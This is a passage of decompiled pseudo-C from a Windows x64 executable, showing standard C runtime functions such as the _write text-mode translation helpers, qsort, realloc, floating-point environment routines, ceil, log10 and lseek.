    *errno() = 9;
    invalid_parameter_noinfo();
  }
  return -1;
}


// ===== ?write_double_translated_ansi_nolock@@YA?AUwrite_result@?A0x4392dfaa@@HQEBDI@Z @ 0x14000dff0 size=0x208 =====
__int64 __fastcall write_double_translated_ansi_nolock(__int64 a1, int a2, const char *a3, int a4)
{
  __int64 v4; // r15
  unsigned __int64 v5; // rsi
  unsigned __int64 v8; // r12
  const char *v9; // rdi
  bool i; // cf
  char v11; // r13
  __int64 v12; // rdx
  char v13; // cl
  char v14; // al
  size_t v15; // r8
  const char *v16; // rdx
  DWORD v17; // eax
  DWORD v18; // r14d
  WCHAR WideCharStr[2]; // [rsp+40h] [rbp-40h] BYREF
  __int16 Buffer; // [rsp+44h] [rbp-3Ch] BYREF
  DWORD NumberOfBytesWritten; // [rsp+48h] [rbp-38h] BYREF
  UINT CodePage; // [rsp+4Ch] [rbp-34h]
  HANDLE hFile; // [rsp+50h] [rbp-30h]
  const char *v25; // [rsp+58h] [rbp-28h]
  _BYTE v26[8]; // [rsp+60h] [rbp-20h] BYREF
  CHAR MultiByteStr[8]; // [rsp+68h] [rbp-18h] BYREF

  v4 = (__int64)a2 >> 6;
  v5 = (unsigned __int64)(a2 & 0x3F) << 6;
  v25 = a3;
  v8 = (unsigned __int64)&a3[a4];
  hFile = *(HANDLE *)(qword_14001D350[v4] + v5 + 40);
  CodePage = GetConsoleCP();
  *(_QWORD *)a1 = 0;
  v9 = a3;
  *(_DWORD *)(a1 + 8) = 0;
  for ( i = (unsigned __int64)a3 < v8; i; i = (unsigned __int64)v9 < v8 )
  {
    v11 = *v9;
    WideCharStr[0] = 0;
    v12 = qword_14001D350[v4];
    v13 = *(_BYTE *)(v12 + v5 + 61);
    if ( (v13 & 4) != 0 )
    {
      v14 = *(_BYTE *)(v12 + v5 + 62);
      *(_BYTE *)(v12 + v5 + 61) = v13 & 0xFB;
      v15 = 2;
      v16 = v26;
      v26[0] = v14;
      v26[1] = v11;
      goto LABEL_10;
    }
    if ( (_pctype_func()[*(unsigned __int8 *)v9] & 0x8000u) == 0 )
    {
      v15 = 1;
      v16 = v9;
LABEL_10:
      if ( mbtowc(WideCharStr, v16, v15) == -1 )
        return a1;
      goto LABEL_11;
    }
    if ( (unsigned __int64)v9 >= v8 )
    {
      *(_BYTE *)(qword_14001D350[v4] + v5 + 62) = *v9;
      *(_BYTE *)(qword_14001D350[v4] + v5 + 61) |= 4u;
      ++*(_DWORD *)(a1 + 4);
      return a1;
    }
    if ( mbtowc(WideCharStr, v9, 2u) == -1 )
      return a1;
    ++v9;
LABEL_11:
    ++v9;
    v17 = WideCharToMultiByte(CodePage, 0, WideCharStr, 1, MultiByteStr, 5, nullptr, nullptr);
    v18 = v17;
    if ( v17 == 0 )
      return a1;
    if ( !WriteFile(hFile, MultiByteStr, v17, &NumberOfBytesWritten, nullptr) )
    {
LABEL_20:
      *(_DWORD *)a1 = GetLastError();
      return a1;
    }
    *(_DWORD *)(a1 + 4) = (_DWORD)v9 + *(_DWORD *)(a1 + 8) - (_DWORD)v25;
    if ( NumberOfBytesWritten < v18 )
      return a1;
    if ( v11 == 10 )
    {
      Buffer = 13;
      if ( !WriteFile(hFile, &Buffer, 1u, &NumberOfBytesWritten, nullptr) )
        goto LABEL_20;
      if ( NumberOfBytesWritten == 0 )
        return a1;
      ++*(_DWORD *)(a1 + 8);
      ++*(_DWORD *)(a1 + 4);
    }
  }
  return a1;
}


// ===== ?write_text_ansi_nolock@@YA?AUwrite_result@?A0x4392dfaa@@HQEBDI@Z @ 0x14000e1f8 size=0x105 =====
DWORD *__fastcall write_text_ansi_nolock(DWORD *a1, int a2, char *a3, int a4)
{
  unsigned __int64 v5; // rbp
  char *v6; // rsi
  __int64 v7; // rax
  void *v8; // r14
  char *v9; // rdi
  char v10; // al
  DWORD v11; // edi
  DWORD v12; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5119]; // [rsp+40h] [rbp-1428h] BYREF
  char v16; // [rsp+143Fh] [rbp-29h] BYREF

  v5 = (unsigned __int64)&a3[a4];
  *a1 = 0;
  v6 = a3;
  a1[1] = 0;
  v7 = qword_14001D350[(__int64)a2 >> 6];
  a1[2] = 0;
  v8 = *(void **)(v7 + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v9 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v10 = *v6++;
        if ( v10 == 10 )
        {
          ++a1[2];
          *v9++ = 13;
        }
        *v9++ = v10;
      }
      while ( v9 < &v16 );
      v11 = (_DWORD)v9 - (unsigned int)Buffer;
      if ( !WriteFile(v8, Buffer, v11, &NumberOfBytesWritten, nullptr) )
        break;
      v12 = NumberOfBytesWritten;
      a1[1] += NumberOfBytesWritten;
      if ( v12 < v11 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *a1 = GetLastError();
  }
  return a1;
}


// ===== ?write_text_utf16le_nolock@@YA?AUwrite_result@?A0x4392dfaa@@HQEBDI@Z @ 0x14000e300 size=0x11c =====
DWORD *__fastcall write_text_utf16le_nolock(DWORD *a1, int a2, __int16 *a3, unsigned int a4)
{
  unsigned __int64 v5; // rbp
  __int16 *v6; // rsi
  __int64 v7; // rax
  void *v8; // r14
  char *v9; // rbx
  __int16 v10; // ax
  DWORD v11; // ebx
  DWORD v12; // eax
  DWORD NumberOfBytesWritten; // [rsp+30h] [rbp-1438h] BYREF
  _BYTE Buffer[5118]; // [rsp+40h] [rbp-1428h] BYREF
  __int16 v16; // [rsp+143Eh] [rbp-2Ah] BYREF

  v5 = (unsigned __int64)a3 + a4;
  *a1 = 0;
  v6 = a3;
  a1[1] = 0;
  v7 = qword_14001D350[(__int64)a2 >> 6];
  a1[2] = 0;
  v8 = *(void **)(v7 + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  if ( (unsigned __int64)a3 < v5 )
  {
    while ( 1 )
    {
      v9 = Buffer;
      do
      {
        if ( (unsigned __int64)v6 >= v5 )
          break;
        v10 = *v6++;
        if ( v10 == 10 )
        {
          a1[2] += 2;
          *(_WORD *)v9 = 13;
          v9 += 2;
        }
        *(_WORD *)v9 = v10;
        v9 += 2;
      }
      while ( v9 < (char *)&v16 );
      v11 = 2 * ((v9 - Buffer) >> 1);
      if ( !WriteFile(v8, Buffer, v11, &NumberOfBytesWritten, nullptr) )
        break;
      v12 = NumberOfBytesWritten;
      a1[1] += NumberOfBytesWritten;
      if ( v12 < v11 || (unsigned __int64)v6 >= v5 )
        return a1;
    }
    *a1 = GetLastError();
  }
  return a1;
}


// ===== ?write_text_utf8_nolock@@YA?AUwrite_result@?A0x4392dfaa@@HQEBDI@Z @ 0x14000e41c size=0x172 =====
__int64 __fastcall write_text_utf8_nolock(__int64 a1, int a2, WCHAR *a3, unsigned int a4)
{
  unsigned __int64 v5; // r14
  int v6; // r15d
  WCHAR *v7; // rdi
  void *v8; // r12
  bool v9; // cf
  WCHAR *v10; // rax
  WCHAR v11; // cx
  unsigned int v12; // ebp
  unsigned int v13; // esi
  DWORD NumberOfBytesWritten; // [rsp+40h] [rbp-1458h] BYREF
  WCHAR WideCharStr[852]; // [rsp+50h] [rbp-1448h] BYREF
  char v17; // [rsp+6F8h] [rbp-DA0h] BYREF
  CHAR MultiByteStr[3424]; // [rsp+700h] [rbp-D98h] BYREF

  v5 = (unsigned __int64)a3 + a4;
  v6 = (int)a3;
  v7 = a3;
  v8 = *(void **)(qword_14001D350[(__int64)a2 >> 6] + ((unsigned __int64)(a2 & 0x3F) << 6) + 40);
  *(_DWORD *)a1 = 0;
  *(_QWORD *)(a1 + 4) = 0;
  v9 = (unsigned __int64)a3 < v5;
LABEL_2:
  if ( v9 )
  {
    v10 = WideCharStr;
    do
    {
      if ( (unsigned __int64)v7 >= v5 )
        break;
      v11 = *v7++;
      if ( v11 == 10 )
        *v10++ = 13;
      *v10++ = v11;
    }
    while ( v10 < (WCHAR *)&v17 );
    v12 = WideCharToMultiByte(0xFDE9u, 0, WideCharStr, v10 - WideCharStr, MultiByteStr, 3413, nullptr, nullptr);
    if ( v12 != 0 )
    {
      v13 = 0;
      while ( WriteFile(v8, &MultiByteStr[v13], v12 - v13, &NumberOfBytesWritten, nullptr) )
      {
        v13 += NumberOfBytesWritten;
        if ( v13 >= v12 )
        {
          *(_DWORD *)(a1 + 4) = (_DWORD)v7 - v6;
          v9 = (unsigned __int64)v7 < v5;
          goto LABEL_2;
        }
      }
    }
    *(_DWORD *)a1 = GetLastError();
  }
  return a1;
}


// ===== _write @ 0x14000e590 size=0xec =====
int __cdecl write(int FileHandle, const void *Buf, unsigned int MaxCharCount)
{
  __int64 v6; // r14
  unsigned __int64 v7; // rsi
  int v8; // edi

  if ( FileHandle == -2 )
  {
    *_doserrno() = 0;
    *errno() = 9;
    return -1;
  }
  if ( FileHandle < 0
    || FileHandle >= (unsigned int)dword_14001D750
    || (v6 = (__int64)FileHandle >> 6,
        v7 = (unsigned __int64)(FileHandle & 0x3F) << 6,
        (*(_BYTE *)(qword_14001D350[v6] + v7 + 56) & 1) == 0) )
  {
    *_doserrno() = 0;
    *errno() = 9;
    invalid_parameter_noinfo();
    return -1;
  }
  sub_14000AD6C(FileHandle);
  v8 = -1;
  if ( (*(_BYTE *)(qword_14001D350[v6] + v7 + 56) & 1) != 0 )
  {
    v8 = write_nolock((unsigned int)FileHandle, Buf, MaxCharCount);
  }
  else
  {
    *errno() = 9;
    *_doserrno() = 0;
  }
  sub_14000AD90(FileHandle);
  return v8;
}


// ===== _write_nolock @ 0x14000e67c size=0x2e1 =====
__int64 __fastcall write_nolock(int a1, char *a2, unsigned int a3)
{
  DWORD v3; // edi
  __int64 v4; // r15
  __int64 v8; // r13
  unsigned __int64 v9; // r14
  __int64 v10; // rcx
  char v11; // bl
  char *v12; // r12
  DWORD v13; // ebx
  wchar_t *v14; // r15
  wchar_t v15; // r13
  __int64 v16; // rax
  __int64 v17; // xmm0_8
  __int64 v18; // rcx
  void *v19; // rcx
  DWORD NumberOfBytesWritten[4]; // [rsp+30h] [rbp-30h] BYREF
  __int64 v21; // [rsp+40h] [rbp-20h]
  __int64 v22; // [rsp+50h] [rbp-10h]
  DWORD Mode; // [rsp+58h] [rbp-8h] BYREF

  v3 = 0;
  v4 = a3;
  if ( a3 == 0 )
    return 0;
  if ( a2 == nullptr
    || (v8 = (__int64)a1 >> 6,
        v9 = (unsigned __int64)(a1 & 0x3F) << 6,
        v22 = v8,
        v10 = qword_14001D350[v8],
        (unsigned __int8)((v11 = *(_BYTE *)(v10 + v9 + 57)) - 1) <= 1u)
    && (a3 & 1) != 0 )
  {
    *_doserrno() = 0;
    *errno() = 22;
    invalid_parameter_noinfo();
    return 0xFFFFFFFFLL;
  }
  if ( (*(_BYTE *)(v10 + v9 + 56) & 0x20) != 0 )
    common_lseek_nolock<__int64>((unsigned int)a1, 0, 2);
  v21 = 0;
  if ( isatty(a1) != 0
    && *(char *)(qword_14001D350[v8] + v9 + 56) < 0
    && (*(_QWORD *)(*((_QWORD *)_acrt_getptd() + 18) + 312LL) != 0 || *(_BYTE *)(qword_14001D350[v8] + v9 + 57) != 0)
    && GetConsoleMode(*(HANDLE *)(qword_14001D350[v8] + v9 + 40), &Mode) )
  {
    if ( v11 != 0 )
    {
      if ( (unsigned __int8)(v11 - 1) > 1u )
        goto LABEL_40;
      NumberOfBytesWritten[0] = 0;
      v12 = &a2[v4];
      v13 = 0;
      v14 = (wchar_t *)a2;
      NumberOfBytesWritten[1] = 0;
      if ( a2 < v12 )
      {
        while ( 1 )
        {
          v15 = *v14;
          if ( putwch_nolock(*v14) != v15 )
            break;
          v13 += 2;
          NumberOfBytesWritten[1] = v13;
          if ( v15 == 10 )
          {
            if ( putwch_nolock(0xDu) != 13 )
              break;
            NumberOfBytesWritten[1] = ++v13;
            ++v3;
          }
          if ( ++v14 >= (wchar_t *)v12 )
            goto LABEL_25;
        }
        NumberOfBytesWritten[0] = GetLastError();
LABEL_25:
        v8 = v22;
      }
      goto LABEL_38;
    }
    v16 = write_double_translated_ansi_nolock((__int64)NumberOfBytesWritten, a1, a2, v4);
  }
  else
  {
    v18 = qword_14001D350[v8];
    if ( *(char *)(v18 + v9 + 56) >= 0 )
    {
      v19 = *(void **)(v18 + v9 + 40);
      memset(NumberOfBytesWritten, 0, 12);
      if ( !WriteFile(v19, a2, v4, &NumberOfBytesWritten[1], nullptr) )
        NumberOfBytesWritten[0] = GetLastError();
      v3 = NumberOfBytesWritten[2];
LABEL_38:
      v17 = *(_QWORD *)NumberOfBytesWritten;
      goto LABEL_39;
    }
    if ( v11 != 0 )
    {
      if ( v11 == 1 )
      {
        v16 = write_text_utf8_nolock((__int64)NumberOfBytesWritten, a1, (WCHAR *)a2, v4);
      }
      else
      {
        if ( v11 != 2 )
          goto LABEL_40;
        v16 = (__int64)write_text_utf16le_nolock(NumberOfBytesWritten, a1, (__int16 *)a2, v4);
      }
    }
    else
    {
      v16 = (__int64)write_text_ansi_nolock(NumberOfBytesWritten, a1, a2, v4);
    }
  }
  v17 = *(_QWORD *)v16;
  v3 = *(_DWORD *)(v16 + 8);
LABEL_39:
  v21 = v17;
LABEL_40:
  if ( HIDWORD(v21) == 0 )
  {
    if ( (_DWORD)v21 != 0 )
    {
      if ( (_DWORD)v21 == 5 )
      {
        *errno() = 9;
        *_doserrno() = 5;
      }
      else
      {
        _acrt_errno_map_os_error(v21);
      }
    }
    else
    {
      if ( (*(_BYTE *)(qword_14001D350[v8] + v9 + 56) & 0x40) != 0 && *a2 == 26 )
        return 0;
      *errno() = 28;
      *_doserrno() = 0;
    }
    return 0xFFFFFFFFLL;
  }
  return HIDWORD(v21) - v3;
}


// ===== __crtLCMapStringW @ 0x14000e960 size=0x87 =====
int __fastcall _crtLCMapStringW(__int64 a1, DWORD a2, const wchar_t *a3, int a4, WCHAR *a5, int a6)
{
  unsigned int v6; // ebx
  unsigned int v10; // eax
  bool v11; // sf
  bool v12; // of

  v6 = a4;
  if ( a4 > 0 )
  {
    v10 = wcsnlen(a3, a4);
    v12 = __OFSUB__(v10, v6);
    v11 = (int)(v10 - v6) < 0;
    v6 = v10 + 1;
    if ( v11 == v12 )
      v6 = v10;
  }
  return _acrt_LCMapStringEx(a1, a2, a3, v6, a5, a6, 0, 0, 0);
}


// ===== ?shortsort@@YAXPEAD0_KP6AHPEBX2@Z@Z @ 0x14000e9f0 size=0xcc =====
void __fastcall shortsort(char *a1, char *a2, __int64 a3, int (__fastcall *a4)(char *, char *))
{
  char *v6; // rdi
  char *v7; // r12
  char *v9; // rbx
  char *i; // rsi
  __int64 v11; // r8
  char *v12; // rax
  signed __int64 v13; // rbx
  char v14; // dl

  if ( a2 > a1 )
  {
    v6 = a2;
    v7 = &a1[a3];
    do
    {
      v9 = a1;
      for ( i = v7; i <= v6; i += a3 )
      {
        if ( a4(i, v9) > 0 )
          v9 = i;
      }
      v11 = a3;
      v12 = v6;
      if ( v9 != v6 && a3 != 0 )
      {
        v13 = v9 - v6;
        do
        {
          v14 = v12[v13];
          v12[v13] = *v12;
          *v12++ = v14;
          --v11;
        }
        while ( v11 != 0 );
      }
      v6 -= a3;
    }
    while ( v6 > a1 );
  }
}


// ===== qsort @ 0x14000eac0 size=0x334 =====
void __cdecl qsort(
        void *Base,
        size_t NumOfElements,
        size_t SizeOfElements,
        _CoreCrtNonSecureSearchSortCompareFunction CompareFunction)
{
  char *v6; // r12
  char *v7; // r15
  __int64 v8; // r13
  size_t v9; // rsi
  char *v10; // rsi
  size_t v11; // r8
  _BYTE *v12; // rdx
  char *v13; // r9
  char v14; // cl
  size_t v15; // r8
  char *v16; // rdx
  signed __int64 v17; // r9
  char v18; // cl
  size_t v19; // r8
  char *v20; // rdx
  size_t v21; // r9
  char v22; // cl
  char *v23; // rbx
  char *v24; // rdi
  char *v25; // rdx
  __int64 v26; // r9
  char v27; // cl
  char *v28; // rdi
  _QWORD v29[124]; // [rsp+20h] [rbp-438h]

  v6 = (char *)Base;
  if ( (Base != nullptr || NumOfElements == 0) && SizeOfElements != 0 && CompareFunction != nullptr )
  {
    if ( NumOfElements >= 2 )
    {
      v7 = (char *)Base + SizeOfElements * (NumOfElements - 1);
      v8 = 0;
      while ( 1 )
      {
        while ( 1 )
        {
          v9 = (v7 - v6) / SizeOfElements + 1;
          if ( v9 <= 8 )
          {
            shortsort(v6, v7, SizeOfElements, (int (__fastcall *)(char *, char *))CompareFunction);
            goto LABEL_10;
          }
          v10 = &v6[SizeOfElements * (v9 >> 1)];
          if ( ((int (__fastcall *)(char *, char *))CompareFunction)(v6, v10) > 0 )
          {
            v11 = SizeOfElements;
            v12 = v10;
            if ( v6 != v10 )
            {
              v13 = (char *)(v6 - v10);
              do
              {
                v14 = v12[(_QWORD)v13];
                v12[(_QWORD)v13] = *v12;
                *v12++ = v14;
                --v11;
              }
              while ( v11 != 0 );
            }
          }
          if ( ((int (__fastcall *)(char *, char *, size_t))CompareFunction)(v6, v7, v11) > 0 )
          {
            v15 = SizeOfElements;
            v16 = v7;
            if ( v6 != v7 )
            {
              v17 = v6 - v7;
              do
              {
                v18 = v16[v17];
                v16[v17] = *v16;
                *v16++ = v18;
                --v15;
              }
              while ( v15 != 0 );
            }
          }
          if ( ((int (__fastcall *)(char *, char *, size_t))CompareFunction)(v10, v7, v15) > 0 )
          {
            v19 = SizeOfElements;
            v20 = v7;
            if ( v10 != v7 )
            {
              v21 = v10 - v7;
              do
              {
                v22 = v20[v21];
                v20[v21] = *v20;
                *v20++ = v22;
                --v19;
              }
              while ( v19 != 0 );
            }
          }
          v23 = v6;
          v24 = v7;
          while ( 1 )
          {
            if ( v10 > v23 )
            {
              while ( 1 )
              {
                v23 += SizeOfElements;
                if ( v23 >= v10 )
                  break;
                if ( ((int (__fastcall *)(char *, char *, size_t))CompareFunction)(v23, v10, v19) > 0 )
                {
                  if ( v10 > v23 )
                    goto LABEL_31;
                  goto LABEL_29;
                }
              }
            }
            do
LABEL_29:
              v23 += SizeOfElements;
            while ( v23 <= v7 && ((int (__fastcall *)(char *, char *, size_t))CompareFunction)(v23, v10, v19) <= 0 );
            do
LABEL_31:
              v24 -= SizeOfElements;
            while ( v24 > v10 && ((int (__fastcall *)(char *, char *))CompareFunction)(v24, v10) > 0 );
            if ( v24 < v23 )
              break;
            v19 = SizeOfElements;
            v25 = v24;
            if ( v23 != v24 )
            {
              v26 = v23 - v24;
              do
              {
                v27 = v25[v26];
                v25[v26] = *v25;
                *v25++ = v27;
                --v19;
              }
              while ( v19 != 0 );
            }
            if ( v10 == v24 )
              v10 = v23;
          }
          v28 = &v24[SizeOfElements];
          if ( v10 < v28 )
          {
            while ( 1 )
            {
              v28 -= SizeOfElements;
              if ( v28 <= v10 )
                break;
              if ( ((unsigned int (__fastcall *)(char *, char *))CompareFunction)(v28, v10) != 0 )
              {
                if ( v10 < v28 )
                  goto LABEL_45;
                goto LABEL_43;
              }
            }
          }
          do
LABEL_43:
            v28 -= SizeOfElements;
          while ( v28 > v6 && ((unsigned int (__fastcall *)(char *, char *))CompareFunction)(v28, v10) == 0 );
LABEL_45:
          if ( v28 - v6 >= v7 - v23 )
            break;
          if ( v23 < v7 )
          {
            v29[v8] = v23;
            v29[v8++ + 62] = v7;
          }
          if ( v6 >= v28 )
          {
LABEL_10:
            if ( --v8 < 0 )
              return;
            v6 = (char *)v29[v8];
            v7 = (char *)v29[v8 + 62];
          }
          else
          {
            v7 = v28;
          }
        }
        if ( v6 < v28 )
        {
          v29[v8] = v6;
          v29[v8++ + 62] = v28;
        }
        if ( v23 >= v7 )
          goto LABEL_10;
        v6 = v23;
      }
    }
  }
  else
  {
    *errno() = 22;
    invalid_parameter_noinfo();
  }
}


// ===== ?initialize_multibyte@@YAHXZ @ 0x14000edf4 size=0x17 =====
_BOOL8 __fastcall initialize_multibyte()
{
  return _acrt_initialize_multibyte() == 0;
}


// ===== _msize @ 0x14000ee0c size=0x39 =====
size_t __cdecl msize(void *Block)
{
  if ( Block != nullptr )
    return HeapSize(hHeap, 0, Block);
  *errno() = 22;
  invalid_parameter_noinfo();
  return -1;
}


// ===== _realloc_base @ 0x14000ee48 size=0x82 =====
void *__cdecl realloc_base(void *Block, size_t Size)
{
  void *result; // rax
  size_t v5; // r9
  void *i; // r8

  if ( Block == nullptr )
    return malloc_base(Size);
  if ( Size == 0 )
  {
    free_base(Block);
    return nullptr;
  }
  if ( Size > 0xFFFFFFFFFFFFFFE0uLL )
  {
LABEL_12:
    *errno() = 12;
    return nullptr;
  }
  v5 = Size;
  for ( i = Block; ; i = Block )
  {
    result = HeapReAlloc(hHeap, 0, i, v5);
    if ( result != nullptr )
      break;
    if ( (unsigned int)sub_140006248() == 0 || callnewh(Size) == 0 )
      goto LABEL_12;
    v5 = Size;
  }
  return result;
}


// ===== __strncnt @ 0x14000eecc size=0x15 =====
size_t __cdecl _strncnt(const char *String, size_t Count)
{
  size_t result; // rax

  result = 0;
  if ( *String != 0 )
  {
    do
    {
      if ( result == Count )
        break;
      ++result;
    }
    while ( String[result] != 0 );
  }
  return result;
}


// ===== fegetenv @ 0x14000eee4 size=0x20 =====
int __cdecl fegetenv(fenv_t *Env)
{
  Env->_Fe_ctl = getfpcontrolword();
  Env->_Fe_stat = getfpstatusword();
  return 0;
}


// ===== fesetenv @ 0x14000ef04 size=0x4c =====
int __cdecl fesetenv(const fenv_t *Env)
{
  __int64 Fe_ctl; // rcx
  fenv_t Enva; // [rsp+30h] [rbp+8h] BYREF

  Enva._Fe_ctl = 0;
  Fe_ctl = Env->_Fe_ctl;
  Enva._Fe_stat = 0;
  setfpcontrolword(Fe_ctl);
  setfpstatusword(Env->_Fe_stat);
  fegetenv(&Enva);
  return Env->_Fe_ctl != Enva._Fe_ctl || Env->_Fe_stat != Enva._Fe_stat;
}


// ===== feholdexcept @ 0x14000ef50 size=0x50 =====
int __cdecl feholdexcept(fenv_t *Env)
{
  fenv_t v3; // rax
  fenv_t Enva; // [rsp+38h] [rbp+10h] BYREF

  Enva._Fe_ctl = 0;
  Enva._Fe_stat = 0;
  if ( fegetenv(&Enva) != 0 )
    return 1;
  v3 = Enva;
  Enva._Fe_ctl |= 0x1Fu;
  *Env = v3;
  if ( fesetenv(&Enva) != 0 )
    return 1;
  clearfp();
  return 0;
}


// ===== ceil @ 0x14000efa0 size=0xc2 =====
double __cdecl ceil(double X)
{
  double v1; // rdx
  double v2; // rax
  _BOOL8 v3; // r8
  double v4; // rax

  v1 = X;
  v2 = fabs(X);
  v3 = *(_QWORD *)&X != (*(_QWORD *)&X & 0x7FFFFFFFFFFFFFFFLL);
  if ( fabs(X) < 9.007199254740992e15 )
  {
    if ( *(_QWORD *)&v2 >= 0x3FF0000000000000uLL )
    {
      *(_QWORD *)&v4 = *(_QWORD *)&X & ~((1LL << (51 - (unsigned __int8)(*(_QWORD *)&X >> 52))) - 1);
      X = v4;
      if ( !v3 && *(_QWORD *)&v4 != *(_QWORD *)&v1 )
        return v4 + 1.0;
    }
    else if ( v2 != 0.0 )
    {
      if ( *(_QWORD *)&X == (*(_QWORD *)&X & 0x7FFFFFFFFFFFFFFFLL) )
        return 1.0;
      else
        return -0.0;
    }
  }
  else if ( *(_QWORD *)&v2 > 0x7FF0000000000000uLL )
  {
    *(_QWORD *)&X |= 0x8000000000000uLL;
  }
  return X;
}


// ===== log10 @ 0x14000f070 size=0x5ab =====
// local variable allocation has failed, the output may be wrong!
double __cdecl log10(double X)
{
  __int64 v1; // rdx
  __int64 v2; // rcx
  double v3; // rax
  __m128i v4; // xmm3
  double v5; // xmm6_8
  __m128i v6; // xmm5
  __m128i v7; // xmm2
  unsigned __int64 v8; // rax
  __m128i v9; // xmm1
  unsigned __int64 v10; // rax
  double v11; // xmm2_8
  __m128i v12; // xmm0
  double v13; // xmm1_8
  double v14; // xmm6_8
  double v15; // xmm1_8
  double v16; // xmm4_8
  double v17; // xmm3_8
  __m128i v18; // xmm2

  if ( dword_14001DBAC == 0 )
  {
    v3 = X;
    v4 = _mm_sub_epi64(_mm_srli_epi64(*(__m128i *)&X, 0x34u), (__m128i)xmmword_140017630);
    if ( COERCE_DOUBLE(*(_QWORD *)&X & 0x7FF0000000000000LL) == INFINITY )
    {
      if ( X == INFINITY )
        return X;
      if ( X != -INFINITY )
      {
        *(_QWORD *)&X |= 0x8000000000000uLL;
        return X;
      }
    }
    else
    {
      v5 = _mm_cvtepi32_pd(v4).m128d_f64[0];
      v6 = 0;
      if ( X > 0.0 )
      {
        v7 = _mm_and_si128(*(__m128i *)&X, (__m128i)xmmword_140017650);
        if ( v5 == -1023.0 )
        {
          v18 = _mm_or_si128(v7, (__m128i)xmmword_1400176E0);
          *(double *)v18.m128i_i64 = *(double *)v18.m128i_i64 - 1.0;
          v6.m128i_i64[0] = v18.m128i_i64[0];
          v7 = _mm_and_si128(v18, (__m128i)xmmword_140017650);
          v3 = *(double *)v7.m128i_i64;
          v5 = _mm_cvtepi32_pd(_mm_sub_epi32(_mm_srli_epi64(v6, 0x34u), (__m128i)xmmword_140017780)).m128d_f64[0];
        }
        v8 = 2 * (*(_QWORD *)&v3 & 0x80000000000LL) + (*(_QWORD *)&v3 & 0xFF00000000000LL);
        v9 = (__m128i)v8;
        if ( fabs(X - 1.0) < 0.0625 )
        {
          *(double *)v12.m128i_i64 = X - 1.0;
          v13 = *(double *)v12.m128i_i64 / (*(double *)v12.m128i_i64 + 2.0);
          v14 = *(double *)v12.m128i_i64 * v13;
          v15 = v13 + v13;
          v16 = (0.01250000000377175 * (v15 * v15) + 0.08333333333333179) * (v15 * v15 * v15)
              + (0.0004348877777076146 * (v15 * v15) + 0.002232139987919448)
              * (v15
               * v15
               * v15
               * (v15
                * v15
                * v15)
               * v15)
              - v14;
          v17 = *(double *)_mm_and_si128(v12, (__m128i)xmmword_140017820).m128i_i64;
          return v17 * 0.0000007349550096401511
               + (v16 + *(double *)v12.m128i_i64 - v17) * 0.0000007349550096401511
               + (v16 + *(double *)v12.m128i_i64 - v17) * 0.4342937469482422
               + v17 * 0.4342937469482422;
        }
        else
        {
          v10 = v8 >> 44;
          v11 = (*(double *)_mm_or_si128(v9, (__m128i)xmmword_1400176F0).m128i_i64
               - *(double *)_mm_or_si128(v7, (__m128i)xmmword_1400176F0).m128i_i64)
              * dbl_140018860[v10];
          return dbl_140017840[v10]
               + 0.3010299950838089 * v5
               + dbl_140018050[v10]
               + 5.801722962879576e-10 * v5
               - ((0.3333333333333333 * v11 + 0.5) * (v11 * v11)
                + v11
                + ((0.1666666666666667 * v11 + 0.2) * v11 + 0.25) * (v11 * v11 * (v11 * v11)))
               * 0.4342944819032518;
        }
      }
      if ( X == 0.0 )
        return log10_special(v2, v1, 1);
    }
    return log10_special(v2, v1, 2);
  }
  __asm
  {
    vpsrlq  xmm3, xmm0, 34h ; '4'
    vmovq   rax, xmm0
    vpsubq  xmm3, xmm3, cs:xmmword_140017630
    vcvtdq2pd xmm6, xmm3
    vpand   xmm5, xmm0, cs:xmmword_140017600
    vcomisd xmm5, qword ptr cs:xmmword_140017600
  }
  if ( _RAX != 0x7FF0000000000000LL )
  {
    if ( _RAX == 0xFFF0000000000000uLL )
    {
      __asm { vmovsd  xmm1, cs:qword_140017610 }
      log10_special(v2, v1, 2);
      __asm { vmovdqa xmm6, [rsp+58h+var_38] }
      return X;
    }
    log10_special(v2, v1, 3);
  }
  __asm { vmovdqa xmm6, [rsp+58h+var_38] }
  return X;
}


// ===== ??$common_lseek_nolock@_J@@YA_JH_JH@Z @ 0x14000f61c size=0x99 =====
LARGE_INTEGER __fastcall common_lseek_nolock<__int64>(int a1, LARGE_INTEGER a2, DWORD a3)
{
  __int64 v3; // rbx
  void *osfhandle; // rax
  LARGE_INTEGER result; // rax
  DWORD LastError; // eax
  LARGE_INTEGER NewFilePointer; // [rsp+48h] [rbp+20h] BYREF

  v3 = a1;
  osfhandle = (void *)get_osfhandle(a1);
  if ( osfhandle == (void *)-1LL )
  {
    *errno() = 9;
    return (LARGE_INTEGER)-1LL;
  }
  if ( !SetFilePointerEx(osfhandle, a2, &NewFilePointer, a3) )
  {
    LastError = GetLastError();
    _acrt_errno_map_os_error(LastError);
    return (LARGE_INTEGER)-1LL;
  }
  result = NewFilePointer;
  if ( NewFilePointer.QuadPart == -1 )
    return (LARGE_INTEGER)-1LL;
  *(_BYTE *)(qword_14001D350[v3 >> 6] + ((unsigned __int64)(v3 & 0x3F) << 6) + 56) &= ~2u;
  return result;
}


// ===== j_??$common_lseek_nolock@_J@@YA_JH_JH@Z @ 0x14000f6b8 size=0x5 =====
// attributes: thunk
LARGE_INTEGER __fastcall common_lseek_nolock<__int64>(int a1, LARGE_INTEGER a2, DWORD a3)
{
  return ??$common_lseek_nolock@_J@@YA_JH_JH@Z(a1, a2, a3);
}


// ===== ??$?RV_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_@@AEAV_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_@@V_lambda_237c231691f317818eb88cc1d5d642d6_@@@?$__crt_seh_guarded_call@H@@QEAAH$$QEAV_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_@@AEAV_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_@@$$QEAV_lambda_237c231691f317818eb88cc1d5d642d6_@@@Z @ 0x14000f6c0 size=0x71 =====
__int64 __fastcall __crt_seh_guarded_call<int>::operator()<_lambda_bfedae4ebbf01fab1bb6dcc6a9e276e0_,_lambda_2fe9b910cf3cbf4a0ab98a02ba45b3ec_ &,_lambda_237c231691f317818eb88cc1d5d642d6_>(
        __int64 a1,
        int *a2,
